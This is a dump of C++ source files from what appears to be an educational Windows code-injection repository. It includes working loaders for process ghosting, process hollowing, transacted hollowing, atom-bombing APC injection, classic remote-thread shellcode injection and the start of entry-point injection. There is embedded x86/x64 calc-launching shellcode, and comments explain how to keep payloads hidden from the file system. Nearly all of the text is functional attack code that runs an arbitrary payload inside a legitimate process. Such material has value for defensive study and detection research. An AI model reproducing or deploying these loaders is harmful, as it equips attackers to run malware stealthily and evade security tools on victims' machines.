	if (!NT_SUCCESS(NtCreateProcessEx(&processHandle, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, dirtySectionHandle, NULL, NULL, FALSE)))
	{
		printf("[Error] - Failed to NtCreateProcessEx using dirty section");
		return false;
	}

	DWORD returnLength = 0;

	// get entry point offset of payload
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
	DWORD entryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;

	// get address of remote image base
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	NTSTATUS error = NtQueryInformationProcess(processHandle, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	int8_t* imageBaseAddress = (int8_t*)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);

	// read remote image base
	DWORD_PTR imageBase;
	if (!ReadProcessMemory(processHandle, imageBaseAddress, &imageBase, sizeof(void*), nullptr))
	{
		printf("[Error] %d - Failed to read remote image base address\n", GetLastError());
	}

	DWORD_PTR payloadEntryPoint = imageBase + entryPoint;

	printf("[Info] - Payload entry point %llx\n", payloadEntryPoint);

	if (!SetupProcessParameters(processHandle, processBasicInformation, targetPath))
	{
		printf("[Error] - Failed to SetupProcessParameters\n");
		return false;
	}

	HANDLE threadHandle = NULL;
	if (!NT_SUCCESS(NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)payloadEntryPoint, NULL, FALSE, 0, 0, 0, NULL)))
	{
		printf("[Error] - Failed to NtCreateThreadEx\n");
		return false;
	}

	printf("[Info] - Created thread executing %llx\n", payloadEntryPoint);

	return true;
}

int main(int argc, char* argv[])
{
	char* applicationPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = "";

	if (argc == 2)
	{
		printf("[Info] - Using default target: %s\n", applicationPath);
		payloadPath = argv[1];
	}
	if (argc == 3)
	{
		applicationPath = argv[1];
		payloadPath = argv[2];
	}

	if (argc != 2 && argc != 3)
	{
		printf("Usage: *.exe [applicationPath] payloadPath\n");
		return 1;
	}

	HMODULE ntdllHandle = LoadLibraryA("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] %d - Failed to LoadLibraryA ntdll\n", GetLastError());
		return 1;
	}
	NtCreateProcessEx = (fnNtCreateProcessEx)GetProcAddress(ntdllHandle, "NtCreateProcessEx");
	NtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");
	RtlCreateProcessParametersEx = (fnRtlCreateProcessParametersEx)GetProcAddress(ntdllHandle, "RtlCreateProcessParametersEx");

	if (!RtlCreateProcessParametersEx || !NtCreateProcessEx || !NtCreateThreadEx)
	{
		printf("[Error] - Failed to resolve NtCreateProcessEx, NtCreateThreadEx or RtlCreateProcessParametersEx\n");
		return 1;
	}

	DWORD payloadSize;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	printf("[Info] - Created payload buffer at %p\n", payloadBuffer);

	if (!Ghost(applicationPath, payloadBuffer, payloadSize))
	{
		printf("[Error] - Failed process ghosting\n");
		return 1;
	}

	return 0;
}
```

`pe_injection/process_hollowing.cpp`:

```cpp
/**
* Demonstrates process hollowing by injecting itself into a process that is created in a suspended state.
* Supports 32- and 64 Bit applications.
*/

#include <Windows.h>
#include <cstdio>
#include <cstdint>


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

using NtQueryInformationProcess = NTSTATUS(WINAPI*)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
);

void InjectedFunction()
{
	MessageBoxA(NULL, "Message from payload", "Injected payload", MB_OK);
}

int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe applicationPath\n");
		return 1;
	}

	char* applicationPath = argv[1];

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	HMODULE ntdllHandle = GetModuleHandleA("ntdll");
	//NtUnmapViewOfSection fnNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
	//NtQueryInformationProcess fnNtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(ntdllHandle, "NtQueryInformationProcess");


	// unmapping currently makes it unstable and is an optional step in process hollowing
	// fnNtUnmapViewOfSection(processHandle, peb.ImageBaseAddress);

	// read PE header of payload (this process injects itself, alternatively an executable file from disc could be read)
	HMODULE baseAddress = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)baseAddress;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((int8_t*)baseAddress + dosHeader->e_lfanew);

	// create space for a copy of the image so we can relocate it locally and then write it to the target process
	int8_t* imageCopy = (int8_t*)malloc(ntHeader->OptionalHeader.SizeOfImage);
	if (!imageCopy)
	{
		printf("[Error] %d - Failed to allocate space for the PE header\n", GetLastError());
		return 1;
	}

	// create a copy of the image
	memcpy(imageCopy, baseAddress, ntHeader->OptionalHeader.SizeOfImage);

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(processInformation.hProcess, NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// calculate the difference between the original base address and the remote memory as we need to account for it when relocating
	int64_t baseAddressDelta = (int64_t)remoteMemory - (int64_t)baseAddress;

	printf("[Info] - Image baseAddress: %p, remoteAddress: %p, absoluteDelta: %llx\n", baseAddress, remoteMemory, abs(baseAddressDelta));

	// relocate the copy of the image
	PIMAGE_BASE_RELOCATION baseRelocation = (PIMAGE_BASE_RELOCATION)(imageCopy + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	while (baseRelocation->SizeOfBlock > 0)
	{
		// calculate relocation entries in current block
		int numberOfEntries = (baseRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
		PBASE_RELOCATION_ENTRY relocationEntry = (PBASE_RELOCATION_ENTRY)(baseRelocation + 1);

		// relocate entries of current block
		for (int i = 0; i < numberOfEntries; i++)
		{
			if (relocationEntry[i].Offset)
			{
				// correct relocation entry by adding the delta between the images
				int64_t* relocationEntryAddress = (int64_t*)(imageCopy + baseRelocation->VirtualAddress + relocationEntry[i].Offset);
				*relocationEntryAddress += baseAddressDelta;
			}
		}
		baseRelocation = (PIMAGE_BASE_RELOCATION)((int8_t*)baseRelocation + baseRelocation->SizeOfBlock);
	}

	printf("[Info] - Relocated image\n");

	// write relocated copy of image to remote memory
	if (!WriteProcessMemory(processInformation.hProcess, remoteMemory, imageCopy, ntHeader->OptionalHeader.SizeOfImage, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote relocated image to remote process\n");

	// execute the injected function
	int8_t* injectedFunctionRemoteAddress = (int8_t*)InjectedFunction + baseAddressDelta;

	printf("[Info] - Going to execute: %p using thread hijacking\n", injectedFunctionRemoteAddress);

	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed GetThreadContext\n", GetLastError());
		return 1;
	}

#ifdef _WIN64
	// for 32bit the address to be executed is in RCX when creating a suspended process
	// RIP did also work
	context.Rcx = (DWORD_PTR)injectedFunctionRemoteAddress;
#else
	// for 32bit the address to be executed is in EAX when creating a suspended process
	context.Eax = (DWORD_PTR)injectedFunctionRemoteAddress;
#endif

	if (!SetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed SetThreadContext\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resuming hijacked thread\n");

	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		return 1;
	}

	return 0;
}
```

`pe_injection/transacted_hollowing.cpp`:

```cpp
/**
* Demonstrates transacted hollowing. A combination of process hollowing and process doppelganging.
* Supports 32- and 64 Bit applications.
* Based on: https://blog.malwarebytes.com/threat-analysis/2018/08/process-doppelganging-meets-process-hollowing_osiris/
*/

#include <Windows.h>
#include <cstdio>
#include <cstdint>
#include <KtmW32.h>

#include "../common/ntddk.h"


int8_t* CreatePayloadBuffer(char* filename, DWORD* filesize)
{
	// open payload file
	HANDLE payloadFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (payloadFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to open payload %s\n", GetLastError(), filename);
		return nullptr;
	}

	// create a mapping of the payload
	HANDLE payloadMapping = CreateFileMapping(payloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!payloadMapping)
	{
		printf("[Error] %d - Failed to CreateFileMapping\n", GetLastError());
		CloseHandle(payloadFile);
		return nullptr;
	}

	// map a view of the payload file into the process
	int8_t* payloadDataView = (int8_t*)MapViewOfFile(payloadMapping, FILE_MAP_READ, 0, 0, 0);
	if (!payloadDataView)
	{
		printf("[Error] %d - Failed to MapViewOfFile\n", GetLastError());
		CloseHandle(payloadMapping);
		CloseHandle(payloadFile);
		return nullptr;
	}

	// allocate space for a copy of the payload
	*filesize = GetFileSize(payloadFile, 0);
	int8_t* payloadFileCopy = (int8_t*)VirtualAlloc(NULL, *filesize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadFileCopy)
	{
		printf("[Error] %d - Failed to VirtualAlloc\n", GetLastError());
		return nullptr;
	}

	// copy payload into allocated memory
	memcpy(payloadFileCopy, payloadDataView, *filesize);

	// cleanup
	UnmapViewOfFile(payloadDataView);
	CloseHandle(payloadMapping);
	CloseHandle(payloadFile);
	return payloadFileCopy;
}

HANDLE CreateDirtySectionOfCleanFile(int8_t* payloadBuffer, DWORD payloadSize)
{
	// create transaction to be rolled back later
	HANDLE transaction = CreateTransaction(nullptr, nullptr, 0, 0, 0, 0, nullptr);
	if (transaction == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateTransaction\n", GetLastError());
		return nullptr;
	}

	// open a clean file transacted
	HANDLE transactedFile = CreateFileTransacted("svchost.exe",
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		transaction,
		nullptr,
		nullptr
	);
	if (transactedFile == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateFileTransacted\n", GetLastError());
		return nullptr;
	}

	// overwrite file with malicious payload
	DWORD numberOfBytesWritten;
	if (!WriteFile(transactedFile, payloadBuffer, payloadSize, &numberOfBytesWritten, nullptr))
	{
		printf("[Error] %d - Failed to WriteFile\n", GetLastError());
		return nullptr;
	}

	// create a dirty section
	HANDLE section = nullptr;
	if (!NT_SUCCESS(NtCreateSection(&section, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, transactedFile)))
	{
		printf("[Error] - Failed to NtCreateSection for malicious executable\n");
		return nullptr;
	}
	CloseHandle(transactedFile);

	// rollback transaction so file system is clean again while we still have a dirty section
	if (!RollbackTransaction(transaction))
	{
		printf("[Error] %d - Failed to RollbackTransaction\n", GetLastError());
		return nullptr;
	}
	CloseHandle(transaction);
	return section;
}

int main(int argc, char* argv[])
{
	char* applicationPath = "C:\\Windows\\System32\\notepad.exe";
	char* payloadPath = "";

	if (argc == 2)
	{
		printf("[Info] - Using default target: %s\n", applicationPath);
		payloadPath = argv[1];
	}
	if (argc == 3)
	{
		applicationPath = argv[1];
		payloadPath = argv[2];
	}
	
	if (argc != 2 && argc != 3)
	{
		printf("Usage: *.exe [applicationPath] payloadPath\n");
		return 1;
	}

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	printf("[Info] - Created suspended process %s with id %d\n", applicationPath, processInformation.dwProcessId);

	// create payload
	DWORD payloadSize = 0;
	int8_t* payloadBuffer = CreatePayloadBuffer(payloadPath, &payloadSize);
	if (!payloadBuffer)
	{
		printf("[Error] - Failed to read payload\n");
		return 1;
	}

	printf("[Info] - Created payload buffer at %p\n", payloadBuffer);

	// create a dirty section of a file that is clean on disc
	HANDLE dirtySectionHandle = CreateDirtySectionOfCleanFile(payloadBuffer, payloadSize);
	if (!dirtySectionHandle)
	{
		printf("[Error] - Failed to create dirty section\n");
		return 1;
	}

	printf("[Info] - Created dirty section with handle %p\n", dirtySectionHandle);

	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T viewSize = 0;
	PVOID mappedDirtySection = 0;

	if (!NT_SUCCESS(NtMapViewOfSection(dirtySectionHandle, processInformation.hProcess,
		&mappedDirtySection, NULL, NULL, NULL, &viewSize, ViewShare, NULL, PAGE_READONLY)))
	{
		printf("[Error] - NtMapViewOfSection - Failed to map dirty section into suspended process\n");
		return 1;
	}

	printf("[Info] - Mapped dirty section into suspended process at %p\n", mappedDirtySection);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)payloadBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(payloadBuffer + dosHeader->e_lfanew);
	DWORD entryPoint = ntHeader->OptionalHeader.AddressOfEntryPoint;

	// get address of remote image base
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("Error %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	int8_t* imageBaseAddress = (int8_t*)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);

	// overwrite remote image base with address of the mapped dirty section
	if (!WriteProcessMemory(processInformation.hProcess, imageBaseAddress, &mappedDirtySection, sizeof(void*), NULL))
	{
		printf("Error %d - Failed to write new image base\n", GetLastError());
		return 1;
	}

	printf("[Info] - Updated remote image base address at %p to dirty payload section %p\n", imageBaseAddress, mappedDirtySection);

	// hijack the thread and make set it up to execute the new entry point
	CONTEXT context = CONTEXT();
	context.ContextFlags = CONTEXT_ALL;
	if (!GetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed GetThreadContext\n", GetLastError());
		return 1;
	}
#ifdef _WIN64
	context.Rcx = (DWORD_PTR)mappedDirtySection + entryPoint;
#else
	context.Eax = (DWORD_PTR)mappedDirtySection + entryPoint;
#endif
	if (!SetThreadContext(processInformation.hThread, &context))
	{
		printf("[Error] %d -  Failed SetThreadContext\n", GetLastError());
		return 1;
	}

	printf("[Info] - Hijacked thread to execute payload entry point %p\n", (int8_t*)mappedDirtySection + entryPoint);

	// continue execution of the suspended process
	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Resumed execution of hijacked thread\n");

	return 0;
}
```

`shellcode_injection/atombombing_injection.cpp`:

```cpp
/**
* Injects a shellcode payload a process using an APC to call GlobalGetAtomNameA in the remote process (atom-bombing).
* The shellcode can then be executed using any execution primitive. We use CreateRemoteThread here because its the most convinient.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- atleast one thread must be in alertable state at some point
*/

#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

#ifdef _WIN64
// https://www.exploit-db.com/shellcodes/49819
// added infinity loop so the remote thread doesnt crash "\xeb\xfe\
// added null terminator required for GlobalAddAtomA "x00" 
unsigned char popCalcNullTerminated[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6\xeb\xfe\x00";
#else
// https://www.exploit-db.com/shellcodes/48116
// removed ExitProcess call at the end
// added infinity loop so the remote thread doesnt crash "\xeb\xfe\
// added null terminator required for GlobalAddAtomA "x00"
char popCalcNullTerminated[] =
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\xeb\xfe\x00";
#endif

typedef VOID(*PPS_APC_ROUTINE)(
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

using fnNtQueueApcThread = NTSTATUS(NTAPI*)(
	_In_ HANDLE ThreadHandle,
	_In_ PPS_APC_ROUTINE ApcRoutine,
	_In_opt_ PVOID ApcArgument1,
	_In_opt_ PVOID ApcArgument2,
	_In_opt_ PVOID ApcArgument3
	);

int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	HMODULE ntdllHandle = GetModuleHandle("ntdll.dll");
	if (!ntdllHandle)
	{
		printf("[Error] %d - Failed to acquire ntdll handle\n", GetLastError());
		return 1;
	}

	fnNtQueueApcThread NtQueueApcThread = (fnNtQueueApcThread)GetProcAddress(ntdllHandle, "NtQueueApcThread");
	if (!NtQueueApcThread)
	{
		printf("[Error] %d - Failed to resolve NtQueueApcThread in ntdll\n", GetLastError());
		return 1;
	}

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("[Error] %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// allocate remote memory
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	// user32dll needs to be loaded for GlobalAddAtomA to work.. 
	LoadLibrary("User32.dll");

	ATOM shellcodeAtom = GlobalAddAtomA((char*)popCalcNullTerminated);
	if (!shellcodeAtom)
	{
		printf("[Error] %d - Failed to GlobalAddAtomA\n", GetLastError());
		return 1;
	}

	// iterate over target processes threads and inject APC into each of them
	// this increases the chance of the shellcode being executed since only one of the thread needs to reach an alertable state
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] %d - Failed to acquire thread handle\n", GetLastError());
				continue;
			}
			NtQueueApcThread(threadHandle, (PPS_APC_ROUTINE)GlobalGetAtomNameA, (PVOID)shellcodeAtom, remoteMemory, (PVOID)(sizeof(popCalcNullTerminated)));
			printf("[Info] - Queued APC for thread %d\n", currentThreadEntry.th32ThreadID);
			CloseHandle(threadHandle);
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));

	// check if a thread wrote the payload. There are also other methods such as Sleep(X) and hope for the best.
	int remotePayloadBuffer;
	do
	{
		ReadProcessMemory(targetProcessHandle, remoteMemory, &remotePayloadBuffer, sizeof(int), nullptr);
		Sleep(100);
	} while (remotePayloadBuffer == 0);
	
	// create a remote thread to execute. We could also use other techniques such as thread hijacking
	HANDLE hThread = CreateRemoteThread(targetProcessHandle, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMemory), nullptr, 0, nullptr);
	if (!hThread)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	return 0;
}
```

`shellcode_injection/classic_shellcode_injection.cpp`:

```cpp
/**
* Injects shellcode into a process
* Supports 32- and 64 Bit applications.
* [Warning] - The current implementation crashes the target process after executing the shellcode.
*/

#include <Windows.h>
#include <string>
#include <cstdio>
#include <tlhelp32.h>

#include "../payload/shellcode.hpp"


int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}

	processName = argv[1];

	printf("[Info] - Injecting shellcode into %s\n", processName);

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("[Error] %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("[Error] %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;

	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("[Error] - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with pid %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("[Error] %d - Failed to acquire process handle\n", GetLastError());
		return 1;
	}

	printf("[Info] - Acquired process handle %p\n", targetProcessHandle);

	// allocate memory in the target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// write shellcode into target process
	if (!WriteProcessMemory(targetProcessHandle, remoteMemory, shellcode, sizeof(shellcode) - 1, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Wrote payload to %p\n", remoteMemory);

	// create a thread in the target process which loads the .dll
	HANDLE hThread = CreateRemoteThread(
		targetProcessHandle,
		nullptr,
		NULL,
		reinterpret_cast<LPTHREAD_START_ROUTINE>(remoteMemory),
		NULL,
		NULL,
		nullptr
	);

	if (!hThread)
	{
		printf("[Error] %d - Failed to CreateRemoteThread\n", GetLastError());
		return 1;
	}

	printf("[Info] - Created remote thread. Executing %p\n", remoteMemory);

	CloseHandle(hThread);
}
```

`shellcode_injection/entrypoint_injection.cpp`:

```cpp
/**
* Creates a suspended process of the supplied binary path and replaces its entry point with shellcode before resuming its execution.
* Supports 32- and 64 Bit applications.
*/

#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstdio>

#include "../payload/shellcode.hpp"


int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe executablePath\n");
		return 1;
	}

	LPSTR binaryPath = argv[1];

	STARTUPINFOA startupInfo = {};
	PROCESS_INFORMATION processInformation = {};
	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	
	// create the process in a suspended state
	if (!CreateProcessA(0, binaryPath, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &startupInfo, &processInformation))
	{
		printf("[Error] %d - Failed to create process %s\n", GetLastError(), binaryPath);
		return 1;
	}

	printf("[Info] - Created process %d in suspended state\n", processInformation.dwProcessId);

	// get process basic information
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		return 1;
	}

	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	LPVOID processBasesAddress = 0;
	if (!ReadProcessMemory(processInformation.hProcess, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		return 1;
	}

	// read PE headers
	const int PE_BUFFER_SIZE = 4096;
	int8_t peBuffer[PE_BUFFER_SIZE] = {};
	if (!ReadProcessMemory(processInformation.hProcess, processBasesAddress, peBuffer, PE_BUFFER_SIZE, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		return 1;
	}

	printf("[Info] - Read PE header at %p\n", processBasesAddress);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
